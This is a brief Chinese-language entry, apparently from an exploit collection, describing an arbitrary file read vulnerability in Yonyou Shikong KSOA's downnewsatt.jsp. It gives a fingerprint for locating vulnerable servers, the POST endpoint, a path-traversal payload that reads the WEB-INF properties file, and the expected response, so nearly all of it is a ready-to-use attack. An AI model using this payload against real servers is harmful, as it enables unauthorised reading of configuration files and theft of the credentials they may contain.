# 用友时空KSOAdownnewsatt.jsp存在任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="onmouseout=\"`
- **请求**：`POST /newspublish/downnewsatt.jsp HTTP/1.1`

**Payload**
```
exclusivenm=../../WEB-INF/classes/shikong.properties
```
- **响应特征**：200